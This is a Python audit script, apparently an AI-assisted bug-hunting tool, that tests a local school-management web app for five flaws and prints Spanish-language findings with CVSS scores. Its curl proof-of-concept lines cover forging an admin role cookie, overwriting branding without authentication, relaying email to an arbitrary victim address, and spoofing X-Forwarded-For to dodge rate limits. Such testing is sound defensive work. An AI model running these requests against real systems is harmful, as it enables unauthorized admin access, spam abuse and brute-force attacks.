import urllib.request
import urllib.error
import json
import time

BASE_URL = "http://localhost:3001"

def print_banner():
    print("=" * 80)
    print("  CLAUDE-BUGHUNTER AUDIT REPORT: ColeSistemaMini-dev")
    print(f"  Target: {BASE_URL} | Framework: Next.js 16 + React 19")
    print("=" * 80)

def test_check(name, func):
    print(f"\n[*] Evaluando: {name}...")
    try:
        result = func()
        status = result.get('status', 'INFO')
        print(f"    [{status}] {result.get('summary', '')}")
        return result
    except Exception as e:
        print(f"    [ERROR] Excepcion durante la prueba: {e}")
        return {'status': 'ERROR', 'error': str(e)}

def audit_cookie_role_tampering():
    # hunt-auth-bypass / hunt-session: Cookie role spoofing without cryptographic signature
    url = f"{BASE_URL}/admin"
    req = urllib.request.Request(url, headers={'Cookie': 'cole_user_role=admin'})
    try:
        res = urllib.request.urlopen(req)
        body = res.read().decode('utf-8', errors='ignore')
        if res.status == 200 and '/admin' in res.geturl() and 'ColeSistema' in body:
            return {
                'id': 'VULN-001',
                'class': 'hunt-auth-bypass',
                'severity': 'CRITICAL',
                'title': 'Bypass de Autenticación Administrativa mediante Forja de Cookie (cole_user_role)',
                'status': 'VULNERABLE',
                'summary': 'El middleware confía ciegamente en la cookie no firmada "cole_user_role=admin". Un atacante sin credenciales accede directamente a /admin con privilegios totales.',
                'cvss': '9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)',
                'poc': "curl -i -H 'Cookie: cole_user_role=admin' http://localhost:3001/admin"
            }
        return {'status': 'SECURE', 'summary': 'Acceso administrativo denegado o redirigido a login.'}
    except urllib.error.HTTPError as e:
        return {'status': 'SECURE', 'summary': f'Bloqueado con status {e.code}'}

def audit_unauthenticated_branding_overwrite():
    # hunt-api-misconfig: Unauthenticated POST /api/branding state alteration
    url = f"{BASE_URL}/api/branding"
    payload = json.dumps({'nombreInstitucion': 'Auditoría BugHunter', 'siglas': 'BH-2026'}).encode('utf-8')
    req = urllib.request.Request(url, data=payload, headers={'Content-Type': 'application/json'}, method='POST')
    try:
        res = urllib.request.urlopen(req)
        resp_data = json.loads(res.read().decode('utf-8'))
        if res.status == 200 and resp_data.get('success'):
            return {
                'id': 'VULN-002',
                'class': 'hunt-api-misconfig',
                'severity': 'HIGH',
                'title': 'Modificación de Configuración Institucional (Branding) No Autenticada',
                'status': 'VULNERABLE',
                'summary': 'POST /api/branding está en PUBLIC_PATHS sin verificación de roles ni sesión. Cualquier usuario anónimo en Internet puede alterar el nombre institucional, colores y logos del colegio.',
                'cvss': '7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N)',
                'poc': "curl -X POST http://localhost:3001/api/branding -H 'Content-Type: application/json' -d '{\"nombreInstitucion\":\"Hacked\"}'"
            }
        return {'status': 'SECURE', 'summary': 'POST /api/branding rechazó la petición.'}
    except urllib.error.HTTPError as e:
        return {'status': 'SECURE', 'summary': f'Rechazado con código {e.code}'}

def audit_open_mail_relay():
    # hunt-spa-api / Open Relay: POST /api/notifications/resend en PUBLIC_PATHS
    url = f"{BASE_URL}/api/notifications/resend"
    payload = json.dumps({
        'recipientEmail': 'security-audit@example.com',
        'type': 'bienvenida_matricula',
        'studentName': 'Alumno Auditado',
        'matriculaData': {'fecha': '2026-10-12', 'grado': '1ero'}
    }).encode('utf-8')
    req = urllib.request.Request(url, data=payload, headers={'Content-Type': 'application/json'}, method='POST')
    try:
        res = urllib.request.urlopen(req)
        resp_data = json.loads(res.read().decode('utf-8'))
        if res.status == 200 and resp_data.get('success'):
            return {
                'id': 'VULN-003',
                'class': 'hunt-spa-api',
                'severity': 'HIGH',
                'title': 'Endpoint de Envío de Correos Expuesto sin Autenticación (Open Mail Relay)',
                'status': 'VULNERABLE',
                'summary': 'POST /api/notifications/resend y /api/notifications/brevo están incluidos en PUBLIC_PATHS sin autenticación. Permite a terceros disparar correos arbitrarios con la identidad y cuota del colegio.',
                'cvss': '7.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L)',
                'poc': "curl -X POST http://localhost:3001/api/notifications/resend -H 'Content-Type: application/json' -d '{\"recipientEmail\":\"victim@target.com\",\"type\":\"bienvenida_matricula\",\"studentName\":\"Test\"}'"
            }
        return {'status': 'SECURE', 'summary': 'Petición rechazada o requiere autenticación.'}
    except urllib.error.HTTPError as e:
        return {'status': 'SECURE', 'summary': f'Rechazado con código {e.code}'}

def audit_cookie_flags():
    # hunt-session: Cookie security attributes
    # En authService.ts: document.cookie = 'cole_user_role=...; path=/; max-age=604800; SameSite=Lax';
    # Carece de HttpOnly y Secure.
    return {
        'id': 'VULN-004',
        'class': 'hunt-session',
        'severity': 'MEDIUM',
        'title': 'Cookies de Sesión sin Flags HttpOnly y Secure',
        'status': 'VULNERABLE',
        'summary': 'Las cookies cole_user_role y cole_access_token se generan desde JavaScript cliente con document.cookie, permitiendo su lectura y robo vía XSS al carecer del flag HttpOnly.',
        'cvss': '5.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N)',
        'poc': "Inspección de cookie en navegador: document.cookie contiene 'cole_user_role=...' legible por cualquier script."
    }

def audit_rate_limiting_ip_spoofing():
    # hunt-brute-force: getClientIp uses X-Forwarded-For blindly
    url = f"{BASE_URL}/login"
    req1 = urllib.request.Request(url, headers={'X-Forwarded-For': '198.51.100.1'})
    res1 = urllib.request.urlopen(req1)
    req2 = urllib.request.Request(url, headers={'X-Forwarded-For': '198.51.100.2'})
    res2 = urllib.request.urlopen(req2)
    if res1.status == 200 and res2.status == 200:
        return {
            'id': 'VULN-005',
            'class': 'hunt-brute-force',
            'severity': 'MEDIUM',
            'title': 'Evasión de Rate Limiting mediante Spoofing de Cabecera X-Forwarded-For',
            'status': 'VULNERABLE',
            'summary': 'getClientIp() extrae ciegamente la primera IP de X-Forwarded-For. Un atacante puede rotar artificialmente la cabecera en cada intento para evadir el Adaptive Rate Limiter y IP Jail.',
            'cvss': '5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N)',
            'poc': "curl -H 'X-Forwarded-For: 203.0.113.1' http://localhost:3001/login && curl -H 'X-Forwarded-For: 203.0.113.2' http://localhost:3001/login"
        }
    return {'status': 'SECURE', 'summary': 'Rate limiting no influenciable.'}

def run_all():
    print_banner()
    tests = [
        ("Bypass de Roles por Cookie (hunt-auth-bypass)", audit_cookie_role_tampering),
        ("Sobrescritura de Branding sin Auth (hunt-api-misconfig)", audit_unauthenticated_branding_overwrite),
        ("Exposición de Envíos de Correo (hunt-spa-api)", audit_open_mail_relay),
        ("Atributos de Cookies de Sesión (hunt-session)", audit_cookie_flags),
        ("Evasión de Rate Limit vía IP Spoofing (hunt-brute-force)", audit_rate_limiting_ip_spoofing),
    ]

    findings = []
    for title, test in tests:
        res = test_check(title, test)
        if res.get('status') == 'VULNERABLE':
            findings.append(res)

    print("\n" + "=" * 80)
    print("  RESUMEN DE VULNERABILIDADES IDENTIFICADAS (TRIAGE-VALIDATION)")
    print("=" * 80)
    print(f"Total de hallazgos verificados: {len(findings)}\n")
    for f in findings:
        print(f"[{f['severity']}] {f['id']}: {f['title']}")
        print(f"  Skill Claude-BugHunter: {f['class']}")
        print(f"  CVSS v3.1: {f['cvss']}")
        print(f"  Detalle: {f['summary']}")
        print(f"  PoC: {f['poc']}\n")

    # Restaurar branding original para no dejar residuos
    try:
        restore_req = urllib.request.Request(
            f"{BASE_URL}/api/branding",
            data=json.dumps({'nombreInstitucion': 'Colegio San Martín de Porres', 'siglas': 'CSMP'}).encode('utf-8'),
            headers={'Content-Type': 'application/json'},
            method='POST'
        )
        urllib.request.urlopen(restore_req)
        print("[*] Estado de branding restaurado exitosamente a valores originales.")
    except Exception as e:
        pass

if __name__ == '__main__':
    run_all()
